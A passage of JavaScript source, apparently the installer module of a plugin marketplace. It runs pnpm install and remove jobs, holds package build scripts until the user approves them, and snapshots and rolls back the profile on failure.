export function runInstall({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace, _corepack }) {
  // Serialized with every other add/remove targeting the same profile (see
  // serializedProducer). Underscored arguments are self-test seams; production
  // callers never pass them. `_restoreWorkspace` exists specifically so the
  // fail-closed restoration path can be attacked without relying on flaky OS
  // permission tricks.
  return serializedProducer(_profileDir ?? profileLockKey(profile), () =>
    runInstallInner({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace, _corepack }));
}

function runInstallInner({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace, _corepack = enablePnpmViaCorepack }) {
  const profileDir = _profileDir ?? ensureProfile(profile);
  try {
    assertNoManifestBuildBypass(profileDir);
  } catch (error) {
    return failedNow(`cannot safely probe install scripts for ${spec}: ${error.message}`);
  }
  // Dependency keys BEFORE pnpm add, so reconcile only manages entries that
  // were (or became) dependencies and never touches template bundles.
  const beforeDeps = new Set(Object.keys(readManifest(profileDir).dependencies ?? {}));
  const collected = [];
  const deltaQueue = [];
  const push = (text) => {
    const plainText = stripTerminalControlSequences(text);
    collected.push(plainText);
    deltaQueue.push(plainText);
  };

  const workspacePath = join(profileDir, "pnpm-workspace.yaml");
  const originalWorkspaceBytes = existsSync(workspacePath) ? readFileSync(workspacePath) : undefined;
  let workspaceRestored = false;
  let workspaceRestoreError;
  const restoreOriginalWorkspace = () => {
    if (workspaceRestored) return true;
    try {
      if (_restoreWorkspace !== undefined) {
        _restoreWorkspace(workspacePath, originalWorkspaceBytes);
      } else if (originalWorkspaceBytes === undefined) {
        rmSync(workspacePath, { force: true });
      } else {
        writeFileSync(workspacePath, originalWorkspaceBytes);
      }
      workspaceRestored = true;
      workspaceRestoreError = undefined;
      return true;
    } catch (err) {
      workspaceRestoreError = err;
      push(`\n[dsh-plugin-mall] WARNING: could not restore pnpm-workspace.yaml: ${err.message}\n`);
      return false;
    }
  };

  // Snapshot the four profile files and register the pending marker BEFORE the
  // first live pnpm add runs. These are the files that decide what pnpm
  // installs and what dsh loads; the marker is what lets startup/CLI recovery
  // roll the profile back if the plugin proves unloadable.
  //
  // An existing marker means one of two things. A needsApproval pause from a
  // previous attempt of THIS SAME install resumes: its snapshot keeps the
  // rollback target at "before this install first began", and re-snapshotting
  // now would capture the paused half-installed state as the rollback target.
  // Anything else (different spec, remove transaction, corrupt marker) is
  // refused — the recovery path owns it.
  let existingMarker;
  try {
    existingMarker = readValidatedPendingSnapshot(profileDir);
  } catch (error) {
    return failedNow(`profile 里有一个读不出来的安装记录，无法判断它是什么，因此拒绝安装 ${spec}（${error.message}）。请先运行 \`dsh-plugin-guard guard recover\` 处理它。`);
  }
  if (existingMarker !== undefined) {
    const previous = existingMarker.metadata?.spec ?? existingMarker.metadata?.packageName ?? "unknown";
    if (existingMarker.operation !== "install" || existingMarker.metadata?.spec !== spec) {
      // 拒绝是对的（marker 是一次性事务，不能被覆盖），但用户看不见 marker，
      // 所以要说清楚挡路的是什么、以及怎么让它让开。暂停在批准闸的那种最
      // 常见——它正是用户刚点过取消的那次安装。
      const paused = pendingApprovalPaused(existingMarker) !== undefined;
      const what = existingMarker.operation === "remove" ? "卸载" : "安装";
      return failedNow(paused
        ? `${previous} 的${what}还没做完——它停在「允许安装依赖」那一步等你决定，没有批准就不会真正装上。现在无法安装 ${spec}。重启 dsh 会撤回那次未批准的${what}，之后就能重新操作；也可以运行 \`dsh-plugin-guard guard recover\` 立即撤回。`
        : `${previous} 的${what}还没了结，现在无法安装 ${spec}。重启 dsh 会自动了结它（装好的提交、没批准的撤回），也可以运行 \`dsh-plugin-guard guard recover\` 手动处理。`,
      { staleOnRestart: true });
    }
    push(`[dsh-plugin-mall] resuming the paused install transaction for ${spec} — its original snapshot stays the rollback target\n`);
    // 事务复活：清掉暂停标记，否则重试成功后的启动提交会被它拦下错误回滚。
    try {
      clearPendingApprovalPause(profileDir);
    } catch (pauseError) {
      push(`[dsh-plugin-mall] WARNING: could not clear the approval-pause mark: ${pauseError.message}\n`);
    }
  } else {
    let snapshot;
    try {
      snapshot = createProfileSnapshot(profileDir, { spec });
    } catch (error) {
      return failedNow(`cannot snapshot profile before installing ${spec}: ${error.message} — refusing to touch the profile`);
    }
    try {
      markPendingSnapshot(snapshot, { spec, preflight });
    } catch (error) {
      rmSync(snapshot.dir, { recursive: true, force: true });
      return failedNow(`cannot register the install pending marker for ${spec}: ${error.message} — refusing to touch the profile`);
    }
  }

  // Neutralize existing allowBuilds before every first pnpm add so strict-dep-builds
  // blocks the lifecycle scripts of everything this transaction introduces,
  // regardless of pre-existing workspace policy. Approvals for packages already
  // on disk are pinned to their installed version and kept — they cannot cover
  // anything new, and re-asking about them on every unrelated install is how a
  // consent gate gets trained into a reflex. See neutralizeWorkspaceContent.
  try {
    if (originalWorkspaceBytes !== undefined) {
      const neutralized = neutralizeWorkspaceContent(
        originalWorkspaceBytes.toString("utf8"),
        (name) => installedVersionOf(name, profileDir),
      );
      writeYamlChecked(workspacePath, neutralized, "pnpm-workspace.yaml");
    } else {
      writeYamlChecked(workspacePath, DEFAULT_WORKSPACE_YAML, "pnpm-workspace.yaml");
    }
  } catch (error) {
    const restored = restoreOriginalWorkspace();
    try {
      if (restored) commitPendingSnapshot(profileDir);
      else rollbackPendingSnapshot(profileDir);
    } catch (cleanupError) {
      return failedNow(`cannot neutralize workspace build policy before installing ${spec}: ${error.message}; cleanup also failed: ${cleanupError.message}`);
    }
    return failedNow(`cannot neutralize workspace allowBuilds before installing ${spec}: ${error.message} — refusing to touch the profile`);
  }

  let current = undefined;
  let cancelRequested = false; // see endedByCancel: exit codes cannot tell us this on Windows
  let pnpmSelfHealed = false;
  const plan = _spawn === undefined ? pnpmSpawnPlan() : { command: "pnpm", shell: false, treeKill: false };
  const spawnImpl = _spawn ?? spawn;

  const spawnAdd = () => {
    const proc = spawnImpl(plan.command, liveAddArgs(spec), {
      cwd: profileDir,
      env: liveAddEnv(),
      shell: plan.shell,
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
    const done = new Promise((resolve) => {
      proc.on("error", (error) => resolve({ spawnError: error }));
      proc.on("close", (exitCode) => resolve({ exitCode, signal: proc.signalCode }));
    });
    proc.stdout?.on("data", (data) => push(data.toString()));
    proc.stderr?.on("data", (data) => push(data.toString()));
    return { proc, done, treeKill: plan.treeKill };
  };

  const spawnApprovedRebuild = (packageNames) => {
    const proc = spawnImpl(plan.command, rebuildApprovedArgs(packageNames), {
      cwd: profileDir,
      env: liveAddEnv(),
      shell: plan.shell,
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
    const done = new Promise((resolveDone) => {
      proc.on("error", (error) => resolveDone({ spawnError: error }));
      proc.on("close", (exitCode) => resolveDone({ exitCode, signal: proc.signalCode }));
    });
    proc.stdout?.on("data", (data) => push(data.toString()));
    proc.stderr?.on("data", (data) => push(data.toString()));
    return { proc, done, treeKill: plan.treeKill };
  };

  /** Post-success accounting: reconcile bundles, register client rows, summarize. */
  const finalizeSuccess = () => {
    const bundles = reconcileBundles(profileDir, beforeDeps);
    // 装后终检（issue #14）：预检的探装禁了 lifecycle 脚本，正式安装可能
    // 在用户审批后执行了它们——入口是否真的产生，只有此刻这棵真树说了算
    // （预检对带安装期脚本的候选只给了 warn）。此刻构建要么跑完要么本来
    // 就没有，终检不过就按失败结算，外层回滚到装前快照。
    const auditIssues = mcpEntryAuditForInstall({ profileDir, candidateName: preflight?.candidate?.name ?? npmNameOf(spec) });
    if (auditIssues.length > 0) {
      push(`\n[dsh-plugin-mall] ${auditIssues[0].title}: ${auditIssues[0].detail}\n`);
      // 只描述失败，不预言恢复：回滚此刻还没发生（在外层收尾里），成没成
      // 由它自己的三态结论去说。在这里写「已回滚」，回滚失败时 detail 会
      // 同时出现「已回滚」和「无法回滚」两句打架的话。
      return { status: "failed", detail: `pnpm installed ${spec}, but ${auditIssues[0].title}: 行 ${auditIssues[0].row ?? auditIssues[0].extra?.row} 的入口 ${auditIssues[0].file ?? auditIssues[0].extra?.file} 仍缺失，安装按失败结算。` };
    }
    const manifest = readManifest(profileDir);
    const currentDeps = new Set(Object.keys(manifest.dependencies ?? {}));
    const clientRows = [];
    const plainDeps = [];
    for (const depName of currentDeps) {
      if (beforeDeps.has(depName)) continue;
      const kind = classifyPackage(depName, profileDir);
      if (kind === "client") {
        const row = ensureClientRow(profileDir, depName);
        if (row.added) clientRows.push(row.rowId);
      } else if (kind !== "bundle") {
        plainDeps.push(depName);
      }
    }
    const notes = [];
    const activeBundles = bundles.filter((name) => currentDeps.has(name));
    if (activeBundles.length > 0) notes.push(`bundle layer(s): ${activeBundles.join(", ")}`);
    if (clientRows.length > 0) notes.push(`registered client row(s) in cordis.patch.yml: ${clientRows.join(", ")}`);
    if (plainDeps.length > 0) notes.push(`plain dependency (no dsh.bundle/dsh.client): ${plainDeps.join(", ")}`);
    const noteText = notes.length > 0 ? ` — ${notes.join("; ")}` : " — installed as a plain dependency (declares no dsh.bundle)";
    return { status: "completed", detail: `installed ${spec} into profile "${profile}"${noteText}. Restart dsh for plugin code to load.` };
  };

  const tryFinalize = () => {
    try {
      return finalizeSuccess();
    } catch (error) {
      return { status: "failed", detail: `pnpm installed ${spec} but post-install reconciliation failed: ${error?.message ?? String(error)}` };
    }
  };

  const settle = async (outcome) => {
    if (outcome.spawnError !== undefined) {
      if (outcome.spawnError.code === "ENOENT" && !pnpmSelfHealed) {
        pnpmSelfHealed = true;
        const healed = await _corepack(push, (child) => { current = child; });
        // 取消要在 retry 之前判。corepack 可能已经被杀、也可能刚好装完，
        // 无论哪种，用户按过 kill 之后就绝不能再去动 profile。
        if (cancelRequested) {
          restoreOriginalWorkspace();
          return { status: "killed", detail: cancelDetail(outcome, cancelRequested) };
        }
        if (healed) {
          const retry = spawnAdd();
          current = retry;
          return settle(await retry.done);
        }
        restoreOriginalWorkspace();
        return { status: "failed", detail: "pnpm not found on PATH and `corepack enable pnpm` could not provision it — install pnpm (e.g. `npm i -g pnpm`) to manage profile plugins" };
      }
      restoreOriginalWorkspace();
      const hint = outcome.spawnError.code === "ENOENT"
        ? "pnpm not found on PATH — install pnpm (e.g. `corepack enable pnpm`) to manage profile plugins"
        : `could not start pnpm: ${outcome.spawnError.message}`;
      return { status: "failed", detail: hint };
    }
    if (endedByCancel(outcome, cancelRequested)) {
      restoreOriginalWorkspace();
      return { status: "killed", detail: cancelDetail(outcome, cancelRequested) };
    }
    const log = collected.join("");
    const ignored = parseIgnoredBuilds(log);

    if (ignored.length === 0) {
      if (!restoreOriginalWorkspace()) {
        return { status: "failed", detail: `could not restore pnpm-workspace.yaml after the script-blocking probe: ${workspaceRestoreError?.message ?? "unknown error"}` };
      }
      if (outcome.exitCode !== 0) {
        return { status: "failed", detail: `pnpm add ${spec} failed (exit code ${outcome.exitCode}). See job output.` };
      }
      return tryFinalize();
    }

    // Materialized proof calculation:
    // Determine candidate name and compute canonical proof from the materialized tree
    const candidateName = resolveCandidateName(profileDir, spec, beforeDeps, preflight);
    let currentProof;
    try {
      currentProof = computeMaterializedProof(profileDir, candidateName, ignored);
    } catch (proofErr) {
      restoreOriginalWorkspace();
      return { status: "failed", detail: `failed to compute materialized package proof for ${spec}: ${proofErr.message}` };
    }

    const consented = new Set((Array.isArray(allowBuildScripts) ? allowBuildScripts : []).map((name) => String(name)));
    const missing = ignored.filter((entry) => !consented.has(entry.name));
    if (missing.length > 0 || approvedProof === undefined) {
      push(`\n[dsh-plugin-mall] pnpm blocked install scripts for: ${ignored.map((entry) => entry.name).join(", ")}\n`);
      push("[dsh-plugin-mall] stopping for approval — no install script ran, nothing is loadable yet.\n");
      let disclosure;
      try {
        const hints = _describe !== undefined
          ? await _describe(missing.length > 0 ? missing : ignored)
          : await describeBuildScripts(missing.length > 0 ? missing : ignored, {
            registry: await resolveRegistry(profile),
            installedName: npmNameOf(spec) ?? undefined,
          });
        disclosure = disclosureFromMaterializedProof(currentProof, hints);
      } catch {
        disclosure = disclosureFromMaterializedProof(currentProof);
      }
      if (!restoreOriginalWorkspace()) {
        return { status: "failed", detail: `could not restore pnpm-workspace.yaml after preparing install-script disclosure: ${workspaceRestoreError?.message ?? "unknown error"}` };
      }
      return { status: "failed", detail: renderApprovalNeeded(spec, disclosure), needsApproval: disclosure, proof: currentProof };
    }

    // Canonical proof verification on retry:
    // Require exact byte-for-byte canonical proof equality
    const currentProofStr = serializeCanonicalProof(currentProof);
    const approvedProofStr = serializeCanonicalProof(approvedProof);
    if (currentProofStr !== approvedProofStr) {
      push("\n[dsh-plugin-mall] security error: materialized package proof does not match approved token proof (content, scripts, or package identity changed) — refusing to run scripts and rolling back\n");
      restoreOriginalWorkspace();
      return {
        status: "failed",
        detail: "security verification failed: package content, scripts, or resolved identity changed after approval was granted — install aborted to protect the profile.",
      };
    }

    push(`\n[dsh-plugin-mall] approved install scripts: ${ignored.map((entry) => entry.name).join(", ")}\n`);
    push("[dsh-plugin-mall] temporarily allowing them in the profile's pnpm-workspace.yaml and retrying once.\n");

    workspaceRestored = false; // allow writing temporary approved builds
    try {
      const currentWs = existsSync(workspacePath) ? readFileSync(workspacePath, "utf8") : DEFAULT_WORKSPACE_YAML;
      const nextWs = enableApprovedBuildSelectors(currentWs, ignored.map((entry) => entry.selector));
      writeYamlChecked(workspacePath, nextWs, "pnpm-workspace.yaml");
    } catch (error) {
      restoreOriginalWorkspace();
      return { status: "failed", detail: `could not allow the blocked build scripts: ${error.message}. The profile was left untouched.` };
    }

    const retry = spawnApprovedRebuild(ignored.map((entry) => entry.name));
    current = retry;
    const retryOutcome = await retry.done;

    // Restore workspace bytes on EVERY branch (including success) before finalize
    if (!restoreOriginalWorkspace()) {
      return { status: "failed", detail: `approved scripts finished but pnpm-workspace.yaml could not be restored: ${workspaceRestoreError?.message ?? "unknown error"}` };
    }

    if (retryOutcome.spawnError !== undefined) {
      return { status: "failed", detail: `retry could not start pnpm: ${retryOutcome.spawnError.message}` };
    }
    if (endedByCancel(retryOutcome, cancelRequested)) {
      return { status: "killed", detail: cancelDetail(retryOutcome, cancelRequested) };
    }
    if (retryOutcome.exitCode === 0) {
      return tryFinalize();
    }
    return { status: "failed", detail: `pnpm add ${spec} still failed after allowing build scripts (exit code ${retryOutcome.exitCode}). See job output.` };
  };

  // spawn 也可能**同步**抛（无效参数、平台细节）。此刻 marker 已写下，且
  // pnpm-workspace.yaml 正停在被中和的状态——异常若绕过下面的 .catch 冒出去，
  // restoreOriginalWorkspace() 永远不会执行。那不只是遗留一个 marker：启动
  // 恢复看到 profile 校验通过就会 commit 并删掉快照，用户的 allowBuilds 批准
  // 就此永久丢失。所以这里必须自己接住并走完整的收尾。
  let first;
  try {
    first = spawnAdd();
  } catch (error) {
    restoreOriginalWorkspace();
    const detail = `could not start pnpm: ${error?.message ?? String(error)}`;
    try {
      rollbackPendingSnapshot(profileDir);
      return { cancel: () => {}, done: Promise.resolve({ status: "failed", detail: `${detail}; the profile was restored to its pre-install state` }), readOutput: () => deltaQueue.splice(0).join("") };
    } catch (rollbackError) {
      return { cancel: () => {}, done: Promise.resolve({ status: "failed", detail: `${detail}; rollback also failed and the pending marker was kept for recovery: ${rollbackError.message}` }), readOutput: () => deltaQueue.splice(0).join("") };
    }
  }
  current = first;
  const done = first.done
    .then((outcome) => settle(outcome))
    .catch((error) => {
      restoreOriginalWorkspace();
      return {
        status: "failed",
        detail: `install of ${spec} hit an internal error: ${error?.message ?? String(error)}`,
      };
    })
    .then((result) => {
      if (!restoreOriginalWorkspace()) {
        result = {
          status: "failed",
          detail: `pnpm-workspace.yaml restoration failed (${workspaceRestoreError?.message ?? "unknown error"}); refusing to finalize and rolling the profile back`,
        };
      }
      if (result.status === "completed") {
        // Keep the marker as-is
      } else if (Array.isArray(result.needsApproval) && result.needsApproval.length > 0) {
        // needsApproval is a PAUSE awaiting the user's decision, not a terminal
        // failure — do not roll back. Rolling back would tear out the candidate
        // pnpm just installed and rewrite the manifest to the old version, so
        // the retry's profile fingerprint and preflight report drift with the
        // changed on-disk state and the approval token's digest check can never
        // pass (real incident: dsh-better-sidebar 0.12.3 → 0.13.0 update died
        // exactly here, "invalid approval token: preflight report changed").
        // The retry's rebuild branch also needs this tree in place. Leave the
        // on-disk state and the marker for the token retry; an abandoned pause
        // is settled by startup recovery / `guard recover`, whose rollback
        // target is still the pre-first-attempt snapshot. The pause is also
        // marked ON the marker: without the mark a restart that passes the
        // static validation would commit the never-approved version and drop
        // the snapshot (both recovery commit points check it).
        try {
          markPendingApprovalPause(profileDir);
        } catch (pauseError) {
          push(`[dsh-plugin-mall] WARNING: could not mark the pause on the pending marker: ${pauseError.message}\n`);
        }
        push("\n[dsh-plugin-mall] install paused for build-script approval — the candidate stays installed with its scripts blocked; approve in the UI to finish, or restart dsh / run `dsh-plugin-guard guard recover` to roll back\n");
      } else {
        // 回滚的结局必须进 detail，不能只进日志流。detail 是模型和面板唯一
        // 一定会读到的东西；把「没能还原」只写进日志，等于让一个状态未知的
        // profile 以一句 killed/failed 悄悄收场。
        //
        // 三种结局分开说，和 rollbackRemove 同一套口径：
        //   还原了 / 没有还原目标（marker 不见了）/ 回滚自己也失败了。
        // 后两种一律 failed —— 取消如果没还原成，那就不是一次干净的取消。
        try {
          const rolled = rollbackPendingSnapshot(profileDir);
          if (rolled === undefined) {
            // 返回 undefined 不抛：marker 不见了，没有还原目标。此前这里
            // 照样打印「已还原」，是一句彻底的谎话。
            push("\n[dsh-plugin-mall] WARNING: no pending marker was found, so the profile could NOT be restored automatically\n");
            result = {
              ...result,
              status: "failed",
              detail: `${result.detail ?? ""}; no pending marker was found, so the profile could NOT be restored automatically — check it before the next start (\`dsh-plugin-guard guard validate --profile ${profile}\`)`,
            };
          } else {
            push("\n[dsh-plugin-mall] install did not complete — restored profile files to their pre-install state and cleared the pending marker\n");
            if (result.status === "killed") {
              result = { ...result, detail: `${result.detail ?? ""}; the profile was restored to its pre-install state` };
            }
          }
        } catch (error) {
          push(`\n[dsh-plugin-mall] WARNING: could not roll back the pending snapshot: ${error.message}\n`);
          result = {
            ...result,
            status: "failed",
            detail: `${result.detail ?? ""}; rollback also failed and the pending marker was kept for recovery: ${error.message}. Check the profile before the next start (restart dsh, or run \`dsh-plugin-guard guard recover\`)`,
          };
        }
      }
      return result;
    });

  return {
    cancel: () => {
      cancelRequested = true; // record intent BEFORE the kill — the exit code will not carry it
      cancelSpawned(current);
    },
    done,
    readOutput: () => {
      if (deltaQueue.length === 0) return "";
      return deltaQueue.splice(0).join("");
    },
  };
}

// ── the background uninstall job ────────────────────────────────────────────

/** A terminal producer for fast-fail cases (no pnpm spawn needed). */
/**
 * @param staleOnRestart - true when this failure's CAUSE cannot outlive a
 *   restart, so the browser should drop the record instead of keeping it as
 *   history. Only the "another transaction owns this profile" refusals qualify:
 *   startup recovery settles that transaction on the way up, so the message
 *   ("X is still waiting at the approval gate, so Y cannot install") describes a
 *   situation that is guaranteed gone — and it is written in the present tense,
 *   so a reader after the restart takes it for the current state. Ordinary
 *   failures (network, preflight blockers, pnpm errors) may well still apply
 *   after a restart and keep their diagnostic value, so they stay.
 */
function failedNow(detail, { staleOnRestart = false } = {}) {
  return {
    cancel: () => {},
    done: Promise.resolve({ status: "failed", detail, staleOnRestart }),
    readOutput: () => "",
  };
}

/**
 * Run `pnpm remove <package>` in the profile directory as a job producer with
 * the same shape as `runInstall`. On success it reconciles
 * `dsh.profile.bundles` (the removed dependency's bundle entry drops out) and
 * deletes the client loader row `ensureClientRow` had registered for it.
 */
export function runRemove({ profile, packageName, _profileDir, _spawn, _corepack }) {
  // Same per-profile queue as runInstall — a remove must never run
  // concurrently with an install (or another remove) in the same profile.
  return serializedProducer(_profileDir ?? profileLockKey(profile), () =>
    runRemoveInner({ profile, packageName, _profileDir, _spawn, _corepack }, false));
}

function runRemoveInner({ profile, packageName, _profileDir, _spawn, _corepack = enablePnpmViaCorepack }, selfHealed) {
  let profileDir;
  if (_profileDir !== undefined) {
    profileDir = _profileDir;
  } else {
    try {
      profileDir = resolveProfileDir(profile);
    } catch (error) {
      return failedNow(`invalid profile: ${error.message}`);
    }
  }
  // Fail closed: an unresolved install transaction (pending marker) owns this
  // profile until startup/CLI recovery commits or rolls it back. Removing
  // packages underneath it would corrupt the state the marker protects.
  // Existence-only, like markPendingSnapshot: a corrupt marker blocks just as
  // hard as a valid one, and is left untouched for the recovery path.
  const markerPath = pendingMarkerPath(profileDir);
  if (existsSync(markerPath)) {
    // 存在性判断（同 markPendingSnapshot）：坏 marker 也照样挡路。所以这里
    // 只能拿到「有」而拿不到「是什么」，文案相应保持笼统，但仍要给出路。
    return failedNow(
      `profile "${profile}" 里有一个还没了结的安装事务，在它了结之前无法卸载 ${packageName}。重启 dsh 会自动了结它（装好的提交、没批准的撤回），也可以运行 \`dsh-plugin-guard guard recover\` 手动处理（事务记录：${markerPath}）。`,
      { staleOnRestart: true });
  }
  const manifestPath = join(profileDir, "package.json");
  if (!existsSync(manifestPath)) {
    return failedNow(`profile "${profile}" has no package.json — nothing installed to remove`);
  }
  const beforeDeps = new Set(Object.keys(readManifest(profileDir).dependencies ?? {}));
  if (!beforeDeps.has(packageName)) {
    return failedNow(`"${packageName}" is not a dependency of profile "${profile}" (installed: ${[...beforeDeps].join(", ") || "none"})`);
  }
  const deltaQueue = [];
  const push = (text) => {
    deltaQueue.push(text);
  };
  let current = undefined;
  let cancelRequested = false; // see endedByCancel: exit codes cannot tell us this on Windows

  // Snapshot + pending marker, exactly as an install does.
  //
  // `pnpm remove` was treated as atomic here, and it is not: a real removal
  // deleted node_modules/<pkg>, then failed writing pnpm-lock.yaml (EPERM on
  // Windows — the rename target was held by another process) and exited
  // nonzero. This function reported "failed" and returned, leaving a profile
  // whose package.json still declared the package as a bundle layer while its
  // directory was gone. dsh then refused to boot at all: resolveBundleDir
  // throws while composing the profile, which happens BEFORE any plugin — so
  // the startup recovery inside apply() could never have run either, and no
  // marker existed for it to act on regardless.
  //
  // The install path has carried this protection from the start, and so has
  // `guard remove` in the CLI. Only this one, the path the marketplace UI and
  // the agent tool both use, was left outside it.
  let snapshot;
  try {
    snapshot = createProfileSnapshot(profileDir, { operation: "remove", packageName });
  } catch (error) {
    return failedNow(`cannot snapshot profile "${profile}" before removing ${packageName}: ${error.message} — refusing to touch the profile`);
  }
  try {
    markPendingSnapshot(snapshot, { operation: "remove", candidate: { name: packageName } });
  } catch (error) {
    rmSync(snapshot.dir, { recursive: true, force: true });
    return failedNow(`cannot register the remove pending marker for ${packageName}: ${error.message} — refusing to touch the profile`);
  }

  /**
   * Restore the pre-remove bytes and settle the marker; never throws.
   *
   * `rolledBack` says whether the profile is actually back to its pre-remove
   * state. Only the caller that cancelled may upgrade this to `killed`, and
   * only when it is true: a cancel whose rollback did not happen is not a
   * clean stop, it is a profile in an unknown state, and it has to keep the
   * `failed` status so nothing downstream reads it as "nothing to see here".
   */
  const rollbackRemove = (reason) => {
    try {
      const rolled = rollbackPendingSnapshot(profileDir);
      if (rolled === undefined) {
        // marker 不见了（外部删除、或本轮压根没登记成功）——没有还原目标，
        // 就绝不能声称已还原。说实话比说好听重要：用户据此决定要不要手工检查。
        return { status: "failed", rolledBack: false, detail: `${reason}; no pending marker was found, so the profile could NOT be restored automatically — check it before the next start (\`dsh-plugin-guard guard validate --profile ${profile}\`)` };
      }
      const rebuild = describeRollbackRebuild(rolled.rebuild);
      return { status: "failed", rolledBack: true, detail: `${reason}; the profile was restored to its pre-remove state${rebuild === undefined ? "" : ` (node_modules rebuild — ${rebuild})`}` };
    } catch (rollbackError) {
      // 回滚失败时**保留 marker**：磁盘状态未知，交给启动恢复/`guard recover`，
      // 绝不能声称已还原。
      return { status: "failed", rolledBack: false, detail: `${reason}; rollback also failed and the pending marker was kept for recovery: ${rollbackError.message}` };
    }
  };

  const plan = _spawn === undefined ? pnpmSpawnPlan() : { command: "pnpm", shell: false, treeKill: false };
  // spawn 也可能**同步**抛（无效参数、平台细节），而 marker 此刻已经写下了。
  // 不接住的话异常会绕过 rollbackRemove 直接冒到 serializedProducer，marker
  // 留在盘上挡住这个 profile 后续所有安装和卸载，直到下次启动恢复收拾它。
  let proc;
  try {
    proc = (_spawn ?? spawn)(plan.command, ["remove", packageName, "--reporter=append-only"], {
      cwd: profileDir,
      env: process.env,
      shell: plan.shell,
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
  } catch (error) {
    const settled = rollbackRemove(`could not start pnpm: ${error?.message ?? String(error)}`);
    return { cancel: () => {}, done: Promise.resolve(settled), readOutput: () => deltaQueue.splice(0).join("") };
  }
  current = { proc, treeKill: plan.treeKill };
  const done = new Promise((resolve) => {
    proc.on("error", (error) => resolve({ spawnError: error }));
    proc.on("close", (exitCode) => resolve({ exitCode, signal: proc.signalCode }));
  }).then(async (outcome) => {
    if (outcome.spawnError !== undefined) {
      // pnpm 缺失时先 corepack 自愈一次再重试（重试复用同一个队列内的
      // producer——若走 runRemove 重新排队会死锁——且必须返回它的 done
      // outcome，返回 producer 本体会让 tracker 把成功任务记成 failed）。
      if (outcome.spawnError.code === "ENOENT" && selfHealed !== true) {
        const healed = await _corepack(push, (child) => { current = child; });
        // 取消要在重试之前判，理由同 install 侧：用户按过 kill 之后就不能再
        // 去动 profile。这一轮 pnpm 从未启动，所以没有东西需要回滚。
        if (cancelRequested) {
          const rolled = rollbackRemove(cancelDetail(outcome, cancelRequested));
          return rolled.rolledBack === true ? { ...rolled, status: "killed" } : rolled;
        }
        // 重试前先把本轮的事务状态收掉——否则重试那一轮会被自己的 marker 挡住。
        // 收不掉就不许重试：递归只会撞上自己的 marker 并返回笼统的「有未了结
        // 事务」，把真正的回滚错因盖掉，而那正是用户需要看到的东西。
        if (healed) {
          try {
            rollbackPendingSnapshot(profileDir);
          } catch (rollbackError) {
            return { status: "failed", detail: `pnpm was missing and corepack enabled it, but clearing this remove's pending marker failed, so the retry was not attempted: ${rollbackError.message}. The marker was kept for recovery (restart dsh, or run \`dsh-plugin-guard guard recover\`).` };
          }
          return await runRemoveInner({ profile, packageName, _profileDir, _spawn, _corepack }, true).done;
        }
      }
      const hint = outcome.spawnError.code === "ENOENT"
        ? "pnpm not found on PATH — install pnpm (e.g. `corepack enable pnpm`) to manage profile plugins"
        : `could not start pnpm: ${outcome.spawnError.message}`;
      return rollbackRemove(hint);
    }
    if (endedByCancel(outcome, cancelRequested)) {
      // 取消也要还原：pnpm 可能已经删掉了 node_modules 里的目录。
      const rolled = rollbackRemove(cancelDetail(outcome, cancelRequested));
      // 还原成功才算干净取消。没还原成功就维持 failed——磁盘状态未知、marker
      // 还在，报成 killed 会让上层（和模型）当作「什么都没发生」。
      return rolled.rolledBack === true ? { ...rolled, status: "killed" } : rolled;
    }
    if (outcome.exitCode !== 0) {
      return rollbackRemove(`pnpm remove ${packageName} failed (exit code ${outcome.exitCode}). See job output.`);
    }
    // 卸完后的对账（bundle 列表、client 行）抛错也必须落成 terminal failed，
    // 不能让 done 拒绝。
    try {
      const bundles = reconcileBundles(profileDir, beforeDeps);
      const clientRow = removeClientRow(profileDir, packageName);
      // 启用/停用留下的覆盖行也要一起带走——否则它会在重装时复活。
      const toggleRows = removeToggleRows(profileDir, packageName);
      // 退出码 0 不等于卸干净了。落盘校验用的是启动恢复同一套判据：
      // profile 整体仍然自洽，且这个包确实从清单和装配层里消失了。任何一条
      // 不过就还原——一个「装着但坏」的 profile 比一个没卸掉的插件糟得多。
      const profileCheck = validatePendingProfile(profileDir);
      const removeCheck = validateRemoveCompletion(profileDir, packageName);
      if (!profileCheck.ok || !removeCheck.ok) {
        const blockers = [...profileCheck.issues, ...removeCheck.issues]
          .filter((entry) => entry.severity === "block")
          .map((entry) => entry.title);
        return rollbackRemove(`pnpm remove ${packageName} exited 0 but the profile did not validate afterwards${blockers.length > 0 ? `: ${blockers.join("; ")}` : ""}`);
      }
      commitPendingSnapshot(profileDir);
      const notes = [`bundle layer(s) now: ${bundles.join(", ") || "none (template only)"}`];
      if (clientRow.removed) notes.push(`removed client loader row "${clientRow.rowId}" from cordis.patch.yml`);
      if (toggleRows.removed.length > 0) notes.push(`removed enable/disable row(s) ${toggleRows.removed.map((id) => `"${id}"`).join(", ")} from cordis.patch.yml`);
      return { status: "completed", detail: `removed ${packageName} from profile "${profile}" — ${notes.join("; ")}. Restart dsh for the change to take effect.` };
    } catch (error) {
      return rollbackRemove(`pnpm removed ${packageName} but post-remove reconciliation failed: ${error?.message ?? String(error)}`);
    }
  }).catch((error) => rollbackRemove(`remove of ${packageName} hit an internal error: ${error?.message ?? String(error)}`));
  proc.stdout?.on("data", (data) => push(data.toString()));
  proc.stderr?.on("data", (data) => push(data.toString()));

  return {
    cancel: () => {
      cancelRequested = true; // record intent BEFORE the kill — the exit code will not carry it
      cancelSpawned(current);
    },
    done,
    readOutput: () => {
      if (deltaQueue.length === 0) return "";
      return deltaQueue.splice(0).join("");
    },
  };
}

// ── offline fixtures ────────────────────────────────────────────────────────
//
// mergeAllowBuilds is the text surgery that bricked a profile: it appended a
// YAML sequence item under a key pnpm had already written as a mapping, and
// the resulting file parsed nowhere, so every later pnpm operation in that
// profile failed until it was repaired by hand. These cases pin every shape it
// can meet. Run them from an INSTALLED copy (the bare imports at the top of
// this file resolve through the host, not through a bare checkout):
//   node ~/.dsh/profiles/web/node_modules/@1e0zj/dsh-plugin-mall/src/installer.js --self-test
const BASE_WS = "packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n";

const ALLOW_BUILDS_FIXTURES = [
  {
    label: "没有 allowBuilds —— 新建，用 pnpm 自己的映射格式",
